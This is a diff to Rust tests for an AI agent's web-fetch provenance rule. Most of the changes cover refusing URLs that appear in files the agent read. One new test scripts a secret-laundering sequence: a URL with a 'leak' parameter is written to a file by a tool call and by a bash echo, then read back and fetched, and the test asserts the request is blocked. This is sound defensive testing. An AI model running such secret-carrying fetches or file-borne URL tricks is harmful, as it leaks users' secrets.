@@ -723,13 +723,11 @@ async fn a_url_the_shell_printed_or_the_model_built_is_not_fetched() {
     assert_eq!(f.count("/page"), 0);
 }
 
-/// What the rule lets through, on purpose: the person's own URL, a URL on
-/// a page that was fetched, and a URL that stands verbatim in a file the
-/// agent read (a repository's own docs link is a link a person wrote; the
-/// rule does not stop a hostile file from naming a URL, nor the agent from
-/// fetching it).
+/// What the rule lets through: the person's own URL, and a URL on a page
+/// that was fetched (a search result is the other source; the first test
+/// covers it).
 #[tokio::test]
-async fn a_url_the_person_a_page_or_a_read_file_gave_is_fetched() {
+async fn a_url_the_person_or_a_page_gave_is_fetched() {
     let f = fake().await;
     let page = f.url("/page");
     let linked = f.url("/linked");
@@ -768,7 +766,15 @@ async fn a_url_the_person_a_page_or_a_read_file_gave_is_fetched() {
         .await;
     let w = t.of("web_fetch");
     assert!(w[0].ok && w[1].ok, "{}", w[1].output);
-    // A line of a file the agent read.
+}
+
+/// An agent in an agentic chat reads the folder's files and may write them,
+/// so a file is never a source: a URL that stands verbatim in a file `read`
+/// returned is refused, with words that say what to do instead.
+#[tokio::test]
+async fn a_url_in_a_folder_file_is_not_fetched() {
+    let f = fake().await;
+    let linked = f.url("/linked");
     let mut n = node(
         steps(vec![
             vec![("read", json!({"path": "NOTES.md"}))],
@@ -783,7 +789,66 @@ async fn a_url_the_person_a_page_or_a_read_file_gave_is_fetched() {
     let t = n
         .turn(ApprovalMode::Auto, None, "read the notes", Decision::Allow)
         .await;
-    assert!(t.of("web_fetch")[0].ok, "{}", t.of("web_fetch")[0].output);
+    assert!(t.of("read")[0].ok);
+    let c = &t.of("web_fetch")[0];
+    assert!(
+        !c.ok && c.output.contains(REFUSED_PROVENANCE),
+        "{}",
+        c.output
+    );
+    assert!(
+        c.output.contains("ask the user") && c.output.contains("Search for it"),
+        "{}",
+        c.output
+    );
+    assert_eq!(f.count("/linked"), 0, "no request was made");
+}
+
+/// The laundering the rule exists to stop: the agent composes a URL with a
+/// secret in it, writes it into a file (with `write`, and with the shell),
+/// reads the file back and fetches it. No step asks in Accept-edits, so the
+/// refusal has to be the rule: the URL is in no source, and the fake web
+/// sees nothing.
+#[tokio::test]
+async fn a_url_written_to_a_file_and_read_back_is_not_fetched() {
+    let f = fake().await;
+    let built = format!("{}?leak=s3cr3t-value-123", f.url("/page"));
+    for how in ["write", "bash"] {
+        let put = if how == "write" {
+            ("write", json!({"path": "u.txt", "content": built}))
+        } else {
+            (
+                "bash",
+                json!({"command": format!("echo '{built}' > u.txt")}),
+            )
+        };
+        let mut n = node(
+            steps(vec![
+                vec![put],
+                vec![("read", json!({"path": "u.txt"}))],
+                vec![fetch(&built)],
+            ]),
+            web_for_tests(&f),
+            vec![],
+            |_| {},
+        )
+        .await;
+        let t = n
+            .turn(ApprovalMode::AcceptEdits, None, "tidy up", Decision::Allow)
+            .await;
+        assert!(t.of("read")[0].ok, "{how}: {}", t.of("read")[0].output);
+        assert!(
+            t.of("read")[0].output.contains("s3cr3t-value-123"),
+            "{how}: the file does hold the URL"
+        );
+        let c = &t.of("web_fetch")[0];
+        assert!(
+            !c.ok && c.output.contains(REFUSED_PROVENANCE),
+            "{how}: {}",
+            c.output
+        );
+        assert_eq!(f.total(), 0, "{how}: a request reached the fake");
+    }
 }
 
 /// Public addresses only, from a node: a loopback address, a private one,
